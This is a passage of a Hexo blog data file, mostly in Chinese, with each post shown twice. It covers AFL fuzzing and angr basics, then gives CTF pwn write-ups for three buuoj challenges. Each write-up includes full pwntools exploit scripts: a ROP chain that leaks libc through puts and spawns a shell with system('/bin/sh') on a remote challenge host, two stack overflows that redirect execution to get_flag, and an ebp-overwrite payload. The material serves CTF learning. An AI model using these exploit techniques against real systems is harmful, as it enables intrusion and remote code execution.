c1.out<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>因为afl在进行模糊测试的时候是将这个<code>input_folder</code>里的文件作为输入，然后对给定的输入使用遗传算法不断进行变化，将变化出来的结果继续输入给程序，因此，虽然随便输入什么都是可以的，但是输入的内容与程序崩溃的输入越接近，则afl得到结果的速度越快。</p>\n</blockquote>\n<h3 id=\"angr\"><a href=\"#angr\" class=\"headerlink\" title=\"angr\"></a>angr</h3><p>安装angr：直接用docker，dockerhub上有angr的镜像</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo docker pull angr/angr<br>sudo docker run (--net host) -it angr/angr bash<br></code></pre></td></tr></table></figure>\n\n<p>angr的简单例子</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-meta\">&gt;&gt;&gt; </span><span class=\"hljs-keyword\">import</span> angr<br><span class=\"hljs-meta\">&gt;&gt;&gt; </span>proj = angr.Project(<span class=\"hljs-string\">&#x27;/bin/true&#x27;</span>) <span class=\"hljs-comment\"># /bin/true是linux的一个永远return 0的程序</span><br><span class=\"hljs-meta\">&gt;&gt;&gt; </span><span class=\"hljs-keyword\">import</span> monkeyhex <span class=\"hljs-comment\"># 将输出转为16进制，但是docker里并不自带，要pip install一下</span><br><span class=\"hljs-meta\">&gt;&gt;&gt; </span>proj.arch<br>&lt;Arch AMD64 (LE)&gt;<br><span class=\"hljs-meta\">&gt;&gt;&gt; </span>proj.entry<br><span class=\"hljs-number\">0x401670</span><br><span class=\"hljs-meta\">&gt;&gt;&gt; </span>proj.filename<br><span class=\"hljs-string\">&#x27;/bin/true&#x27;</span><br></code></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"more":"<h3 id=\"AFL\"><a href=\"#AFL\" class=\"headerlink\" title=\"AFL\"></a>AFL</h3><p>安装afl</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo apt-get install afl<br></code></pre></td></tr></table></figure>\n\n<p>写一个在特定输入会崩溃的程序 <code>c1.cpp</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C++\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;iostream&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span><br><span class=\"hljs-keyword\">using</span> <span class=\"hljs-keyword\">namespace</span> std;<br><span class=\"hljs-function\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">()</span></span><br><span class=\"hljs-function\"></span>&#123;<br>\t<span class=\"hljs-type\">char</span> ptr[<span class=\"hljs-number\">20</span>];<br>\tcin&gt;&gt;ptr;<br>\t<span class=\"hljs-keyword\">if</span>(<span class=\"hljs-built_in\">strcmp</span>(ptr,<span class=\"hljs-string\">&quot;deadbeef&quot;</span>)==<span class=\"hljs-number\">0</span>)&#123;<br>\t\t<span class=\"hljs-built_in\">abort</span>();<br>\t&#125;<br>\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>使用afl-g++编译，这样编译出来的程序会被插桩</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">afl-g++ -g c1.cpp -o c1.out<br></code></pre></td></tr></table></figure>\n\n<p>创建一个<code>input_folder</code>，这里<code>input_folder</code>里先随便放一个文本文件<code>abc</code>，里面写入<code>hello</code>。</p>\n<p>再创建一个<code>output_folder</code>，什么都不用放进去</p>\n<p>开始对得到的程序进行fuzz</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">afl-fuzz -i ./input_folder -o ./output_folder c1.out<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>因为afl在进行模糊测试的时候是将这个<code>input_folder</code>里的文件作为输入，然后对给定的输入使用遗传算法不断进行变化，将变化出来的结果继续输入给程序，因此，虽然随便输入什么都是可以的，但是输入的内容与程序崩溃的输入越接近，则afl得到结果的速度越快。</p>\n</blockquote>\n<h3 id=\"angr\"><a href=\"#angr\" class=\"headerlink\" title=\"angr\"></a>angr</h3><p>安装angr：直接用docker，dockerhub上有angr的镜像</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo docker pull angr/angr<br>sudo docker run (--net host) -it angr/angr bash<br></code></pre></td></tr></table></figure>\n\n<p>angr的简单例子</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-meta\">&gt;&gt;&gt; </span><span class=\"hljs-keyword\">import</span> angr<br><span class=\"hljs-meta\">&gt;&gt;&gt; </span>proj = angr.Project(<span class=\"hljs-string\">&#x27;/bin/true&#x27;</span>) <span class=\"hljs-comment\"># /bin/true是linux的一个永远return 0的程序</span><br><span class=\"hljs-meta\">&gt;&gt;&gt; </span><span class=\"hljs-keyword\">import</span> monkeyhex <span class=\"hljs-comment\"># 将输出转为16进制，但是docker里并不自带，要pip install一下</span><br><span class=\"hljs-meta\">&gt;&gt;&gt; </span>proj.arch<br>&lt;Arch AMD64 (LE)&gt;<br><span class=\"hljs-meta\">&gt;&gt;&gt; </span>proj.entry<br><span class=\"hljs-number\">0x401670</span><br><span class=\"hljs-meta\">&gt;&gt;&gt; </span>proj.filename<br><span class=\"hljs-string\">&#x27;/bin/true&#x27;</span><br></code></pre></td></tr></table></figure>\n\n\n\n"},{"title":"bjdctf_2020_babyrop","date":"2023-04-21T04:29:00.000Z","excerpt":"exp","_content":"\n**题目**\n\nhttps://buuoj.cn/challenges#bjdctf_2020_babyrop\n\n非常基本的一道利用puts函数构造rop链泄露libc基址的题目\n\n**Exp**\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n\np = remote(\"node4.buuoj.cn\",25323)\n\nelf = ELF('./bjdctf_2020_babyrop')\n\nmain = elf.sym['main']\npoprdi_ret = 0x400733\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\n\ns = p.recv()\nprint(s)\n\npayload = b'a'*40 + p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)\n\np.sendline(payload)\n\ns = p.recv()\n\nputs_addr = u64(s[:6].ljust(8,b'\\x00'))\nprint(hex(puts_addr))\n\nlibc =LibcSearcher('puts',puts_addr)\noffset = puts_addr - libc.dump('puts')\nbinsh = offset + libc.dump('str_bin_sh')\nsystem = offset + libc.dump('system')\n\npayload = b'a' * 40 + p64(poprdi_ret) + p64(binsh) + p64(system)\n\np.sendline(payload)\n\np.interactive()\n```\n\n","source":"_posts/ctf-pwn/bjdctf_2020_babyrop.md","raw":"---\ntitle: bjdctf_2020_babyrop\ntags: [ctf-pwn,exp]\ndate: 2023-4-21 12:29:00\ncategories: [ctf-pwn]\nexcerpt: exp\n---\n\n**题目**\n\nhttps://buuoj.cn/challenges#bjdctf_2020_babyrop\n\n非常基本的一道利用puts函数构造rop链泄露libc基址的题目\n\n**Exp**\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n\np = remote(\"node4.buuoj.cn\",25323)\n\nelf = ELF('./bjdctf_2020_babyrop')\n\nmain = elf.sym['main']\npoprdi_ret = 0x400733\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\n\ns = p.recv()\nprint(s)\n\npayload = b'a'*40 + p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)\n\np.sendline(payload)\n\ns = p.recv()\n\nputs_addr = u64(s[:6].ljust(8,b'\\x00'))\nprint(hex(puts_addr))\n\nlibc =LibcSearcher('puts',puts_addr)\noffset = puts_addr - libc.dump('puts')\nbinsh = offset + libc.dump('str_bin_sh')\nsystem = offset + libc.dump('system')\n\npayload = b'a' * 40 + p64(poprdi_ret) + p64(binsh) + p64(system)\n\np.sendline(payload)\n\np.interactive()\n```\n\n","slug":"ctf-pwn/bjdctf_2020_babyrop","published":1,"updated":"2023-04-21T04:31:26.342Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clguc4twr0000skuf4i013kuw","content":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#bjdctf_2020_babyrop\">https://buuoj.cn/challenges#bjdctf_2020_babyrop</a></p>\n<p>非常基本的一道利用puts函数构造rop链泄露libc基址的题目</p>\n<p><strong>Exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br><br>p = remote(<span class=\"hljs-string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"hljs-number\">25323</span>)<br><br>elf = ELF(<span class=\"hljs-string\">&#x27;./bjdctf_2020_babyrop&#x27;</span>)<br><br>main = elf.sym[<span class=\"hljs-string\">&#x27;main&#x27;</span>]<br>poprdi_ret = <span class=\"hljs-number\">0x400733</span><br><br>puts_got = elf.got[<span class=\"hljs-string\">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class=\"hljs-string\">&#x27;puts&#x27;</span>]<br><br>s = p.recv()<br><span class=\"hljs-built_in\">print</span>(s)<br><br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span>*<span class=\"hljs-number\">40</span> + p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br><br>p.sendline(payload)<br><br>s = p.recv()<br><br>puts_addr = u64(s[:<span class=\"hljs-number\">6</span>].ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">b&#x27;\\x00&#x27;</span>))<br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">hex</span>(puts_addr))<br><br>libc =LibcSearcher(<span class=\"hljs-string\">&#x27;puts&#x27;</span>,puts_addr)<br>offset = puts_addr - libc.dump(<span class=\"hljs-string\">&#x27;puts&#x27;</span>)<br>binsh = offset + libc.dump(<span class=\"hljs-string\">&#x27;str_bin_sh&#x27;</span>)<br>system = offset + libc.dump(<span class=\"hljs-string\">&#x27;system&#x27;</span>)<br><br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span> * <span class=\"hljs-number\">40</span> + p64(poprdi_ret) + p64(binsh) + p64(system)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"more":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#bjdctf_2020_babyrop\">https://buuoj.cn/challenges#bjdctf_2020_babyrop</a></p>\n<p>非常基本的一道利用puts函数构造rop链泄露libc基址的题目</p>\n<p><strong>Exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br><br>p = remote(<span class=\"hljs-string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"hljs-number\">25323</span>)<br><br>elf = ELF(<span class=\"hljs-string\">&#x27;./bjdctf_2020_babyrop&#x27;</span>)<br><br>main = elf.sym[<span class=\"hljs-string\">&#x27;main&#x27;</span>]<br>poprdi_ret = <span class=\"hljs-number\">0x400733</span><br><br>puts_got = elf.got[<span class=\"hljs-string\">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class=\"hljs-string\">&#x27;puts&#x27;</span>]<br><br>s = p.recv()<br><span class=\"hljs-built_in\">print</span>(s)<br><br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span>*<span class=\"hljs-number\">40</span> + p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br><br>p.sendline(payload)<br><br>s = p.recv()<br><br>puts_addr = u64(s[:<span class=\"hljs-number\">6</span>].ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">b&#x27;\\x00&#x27;</span>))<br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">hex</span>(puts_addr))<br><br>libc =LibcSearcher(<span class=\"hljs-string\">&#x27;puts&#x27;</span>,puts_addr)<br>offset = puts_addr - libc.dump(<span class=\"hljs-string\">&#x27;puts&#x27;</span>)<br>binsh = offset + libc.dump(<span class=\"hljs-string\">&#x27;str_bin_sh&#x27;</span>)<br>system = offset + libc.dump(<span class=\"hljs-string\">&#x27;system&#x27;</span>)<br><br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span> * <span class=\"hljs-number\">40</span> + p64(poprdi_ret) + p64(binsh) + p64(system)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>\n\n"},{"title":"get_started_3dsctf_2016","date":"2023-04-21T06:12:00.000Z","excerpt":"exp","_content":"\n**题目**\n\nhttps://buuoj.cn/challenges#get_started_3dsctf_2016\n\n一道十分简单的栈溢出，将main的返回地址移交给自带的get_flag函数\n\n把这道题列出来的原因在于，程序没有开启标准输入输出，\n\n如果单纯执行完get_flag不设置一个正确的返回地址，这个函数里的输出显示不出来\n\n（详细原因目前也不是很清楚）\n\n\n\n**Exp**\n\n针对上述问题，选择exit函数作为get_flag的返回地址（不能放一个空着的p32(0)进去）\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n\n#p = remote(\"node4.buuoj.cn\",27230)\np = process('./get_started_3dsctf_2016')\n\nelf = ELF('./get_started_3dsctf_2016')\n\nget_flag = 0x80489A0\nparam1 = 0x308CD64F\nparam2 = 0x195719D1\n\nsleep(0.1)\npayload = b'a'*56 + p32(get_flag) +p32(0x0804E6A0) + p32(param1) + p32(param2)\n\np.sendline(payload)\n\np.interactive()\n\n```\n\n","source":"_posts/ctf-pwn/get_started_3dsctf_2016.md","raw":"---\ntitle: get_started_3dsctf_2016\ntags: [ctf-pwn,exp]\ndate: 2023-4-21 14:12:00\ncategories: [ctf-pwn]\nexcerpt: exp\n---\n\n**题目**\n\nhttps://buuoj.cn/challenges#get_started_3dsctf_2016\n\n一道十分简单的栈溢出，将main的返回地址移交给自带的get_flag函数\n\n把这道题列出来的原因在于，程序没有开启标准输入输出，\n\n如果单纯执行完get_flag不设置一个正确的返回地址，这个函数里的输出显示不出来\n\n（详细原因目前也不是很清楚）\n\n\n\n**Exp**\n\n针对上述问题，选择exit函数作为get_flag的返回地址（不能放一个空着的p32(0)进去）\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n\n#p = remote(\"node4.buuoj.cn\",27230)\np = process('./get_started_3dsctf_2016')\n\nelf = ELF('./get_started_3dsctf_2016')\n\nget_flag = 0x80489A0\nparam1 = 0x308CD64F\nparam2 = 0x195719D1\n\nsleep(0.1)\npayload = b'a'*56 + p32(get_flag) +p32(0x0804E6A0) + p32(param1) + p32(param2)\n\np.sendline(payload)\n\np.interactive()\n\n```\n\n","slug":"ctf-pwn/get_started_3dsctf_2016","published":1,"updated":"2023-04-21T06:17:11.390Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clguc4twx0001skuf4xmxejam","content":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#get_started_3dsctf_2016\">https://buuoj.cn/challenges#get_started_3dsctf_2016</a></p>\n<p>一道十分简单的栈溢出，将main的返回地址移交给自带的get_flag函数</p>\n<p>把这道题列出来的原因在于，程序没有开启标准输入输出，</p>\n<p>如果单纯执行完get_flag不设置一个正确的返回地址，这个函数里的输出显示不出来</p>\n<p>（详细原因目前也不是很清楚）</p>\n<p><strong>Exp</strong></p>\n<p>针对上述问题，选择exit函数作为get_flag的返回地址（不能放一个空着的p32(0)进去）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br><br><span class=\"hljs-comment\">#p = remote(&quot;node4.buuoj.cn&quot;,27230)</span><br>p = process(<span class=\"hljs-string\">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>elf = ELF(<span class=\"hljs-string\">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>get_flag = <span class=\"hljs-number\">0x80489A0</span><br>param1 = <span class=\"hljs-number\">0x308CD64F</span><br>param2 = <span class=\"hljs-number\">0x195719D1</span><br><br>sleep(<span class=\"hljs-number\">0.1</span>)<br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span>*<span class=\"hljs-number\">56</span> + p32(get_flag) +p32(<span class=\"hljs-number\">0x0804E6A0</span>) + p32(param1) + p32(param2)<br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"more":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#get_started_3dsctf_2016\">https://buuoj.cn/challenges#get_started_3dsctf_2016</a></p>\n<p>一道十分简单的栈溢出，将main的返回地址移交给自带的get_flag函数</p>\n<p>把这道题列出来的原因在于，程序没有开启标准输入输出，</p>\n<p>如果单纯执行完get_flag不设置一个正确的返回地址，这个函数里的输出显示不出来</p>\n<p>（详细原因目前也不是很清楚）</p>\n<p><strong>Exp</strong></p>\n<p>针对上述问题，选择exit函数作为get_flag的返回地址（不能放一个空着的p32(0)进去）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br><br><span class=\"hljs-comment\">#p = remote(&quot;node4.buuoj.cn&quot;,27230)</span><br>p = process(<span class=\"hljs-string\">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>elf = ELF(<span class=\"hljs-string\">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>get_flag = <span class=\"hljs-number\">0x80489A0</span><br>param1 = <span class=\"hljs-number\">0x308CD64F</span><br>param2 = <span class=\"hljs-number\">0x195719D1</span><br><br>sleep(<span class=\"hljs-number\">0.1</span>)<br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span>*<span class=\"hljs-number\">56</span> + p32(get_flag) +p32(<span class=\"hljs-number\">0x0804E6A0</span>) + p32(param1) + p32(param2)<br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>\n\n"},{"title":"pwnable_simple_login","date":"2023-04-24T03:52:00.000Z","excerpt":"只能溢出到ebp，无法溢出返回地址","_content":"\n**题目**\n\nhttps://buuoj.cn/challenges#pwnable_simple_login\n\n**方法**\n\n程序流程\n\n1. 读入一个字符串，进行base64解密\n2. 解密结果不能超过12字节\n3. 对解密结果进行md5加密，比对加密结果\n4. 执行system\n\nmain函数读取char30的输入显然是没有漏洞的\n\n![](/img/pwnable_simple_login/1.jpg)\n\nB64Decode这个函数我也没太看懂，BIO_XXX这些函数我也不了解，就当它解码出来了吧（\n\n然后把解码的内容放到input这个全局变量里，然后在auth的时候又使用了这个input\n\n![](/img/pwnable_simple_login/2.jpg)\n\nauth里v4只有8字节，因此可以使用12字节的input溢出到ebp里\n\n\n\n能够只溢出ebp就能控制执行流程的原理在于，此函数返回之后，上一级函数的栈底会被修改，而程序会通过自定义的这个栈底地址，+4去找到这个上级函数的返回地址，因此变相实现了返回地址的控制。\n\n本题目中将ebp指向input，那么input+4设置为correct函数地址就可以完成溢出\n\n另外，correct会验证前input前四个字节是不是deadbeef，因此payload由`0xdeadbeef`，`correct_addr`，`inputs_addr`三部分组成。\n\n**exp**\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n\np = process('./login')\n\ncorrect = 0x804925f\ninputs = 0x811eb40\npayload = base64.b64encode(p32(0xdeadbeef) + p32(correct) + p32(inputs))\np.recv()\nsleep(0.5)\np.sendline(payload)\nsleep(0.5)\np.interactive()\n```\n\n","source":"_posts/ctf-pwn/pwnable_simple_login.md","raw":"---\ntitle: pwnable_simple_login\ntags: [ctf-pwn,exp]\ndate: 2023-4-24 11:52:00\ncategories: [ctf-pwn]\nexcerpt: 只能溢出到ebp，无法溢出返回地址\n---\n\n**题目**\n\nhttps://buuoj.cn/challenges#pwnable_simple_login\n\n**方法**\n\n程序流程\n\n1. 读入一个字符串，进行base64解密\n2. 解密结果不能超过12字节\n3. 对解密结果进行md5加密，比对加密结果\n4. 执行system\n\nmain函数读取char30的输入显然是没有漏洞的\n\n![](/img/pwnable_simple_login/1.jpg)\n\nB64Decode这个函数我也没太看懂，BIO_XXX这些函数我也不了解，就当它解码出来了吧（\n\n然后把解码的内容放到input这个全局变量里，然后在auth的时候又使用了这个input\n\n![](/img/pwnable_simple_login/2.jpg)\n\nauth里v4只有8字节，因此可以使用12字节的input溢出到ebp里\n\n\n\n能够只溢出ebp就能控制执行流程的原理在于，此函数返回之后，上一级函数的栈底会被修改，而程序会通过自定义的这个栈底地址，+4去找到这个上级函数的返回地址，因此变相实现了返回地址的控制。\n\n本题目中将ebp指向input，那么input+4设置为correct函数地址就可以完成溢出\n\n另外，correct会验证前input前四个字节是不是deadbeef，因此payload由`0xdeadbeef`，`correct_addr`，`inputs_addr`三部分组成。\n\n**exp**\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n\np = process('./login')\n\ncorrect = 0x804925f\ninputs = 0x811eb40\npayload = base64.b64encode(p32(0xdeadbeef) + p32(correct) + p32(inputs))\np.recv()\nsleep(0.5)\np.sendline(payload)\nsleep(0.5)\np.interactive()\n```\n\n","slug":"ctf-pwn/pwnable_simple_login","published":1,"updated":"2023-04-24T04:21:14.280Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clguc4twy0003skuf5hfy76uc","content":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#pwnable_simple_login\">https://buuoj.cn/challenges#pwnable_simple_login</a></p>\n<p><strong>方法</strong></p>\n<p>程序流程</p>\n<ol>\n<li>读入一个字符串，进行base64解密</li>\n<li>解密结果不能超过12字节</li>\n<li>对解密结果进行md5加密，比对加密结果</li>\n<li>执行system</li>\n</ol>\n<p>main函数读取char30的输入显然是没有漏洞的</p>\n<p><img src=\"/img/pwnable_simple_login/1.jpg\"></p>\n<p>B64Decode这个函数我也没太看懂，BIO_XXX这些函数我也不了解，就当它解码出来了吧（</p>\n<p>然后把解码的内容放到input这个全局变量里，然后在auth的时候又使用了这个input</p>\n<p><img src=\"/img/pwnable_simple_login/2.jpg\"></p>\n<p>auth里v4只有8字节，因此可以使用12字节的input溢出到ebp里</p>\n<p>能够只溢出ebp就能控制执行流程的原理在于，此函数返回之后，上一级函数的栈底会被修改，而程序会通过自定义的这个栈底地址，+4去找到这个上级函数的返回地址，因此变相实现了返回地址的控制。</p>\n<p>本题目中将ebp指向input，那么input+4设置为correct函数地址就可以完成溢出</p>\n<p>另外，correct会验证前input前四个字节是不是deadbeef，因此payload由<code>0xdeadbeef</code>，<code>correct_addr</code>，<code>inputs_addr</code>三部分组成。</p>\n<p><strong>exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br><br>p = process(<span class=\"hljs-string\">&#x27;./login&#x27;</span>)<br><br>correct = <span class=\"hljs-number\">0x804925f</span><br>inputs = <span class=\"hljs-number\">0x811eb40</span><br>payload = base64.b64encode(p32(<span class=\"hljs-number\">0xdeadbeef</span>) + p32(correct) + p32(inputs))<br>p.recv()<br>sleep(<span class=\"hljs-number\">0.5</span>)<br>p.sendline(payload)<br>sleep(<span class=\"hljs-number\">0.5</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"more":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#pwnable_simple_login\">https://buuoj.cn/challenges#pwnable_simple_login</a></p>\n<p><strong>方法</strong></p>\n<p>程序流程</p>\n<ol>\n<li>读入一个字符串，进行base64解密</li>\n<li>解密结果不能超过12字节</li>\n<li>对解密结果进行md5加密，比对加密结果</li>\n<li>执行system</li>\n</ol>\n<p>main函数读取char30的输入显然是没有漏洞的</p>\n<p><img src=\"/img/pwnable_simple_login/1.jpg\"></p>\n<p>B64Decode这个函数我也没太看懂，BIO_XXX这些函数我也不了解，就当它解码出来了吧（</p>\n<p>然后把解码的内容放到input这个全局变量里，然后在auth的时候又使用了这个input</p>\n<p><img 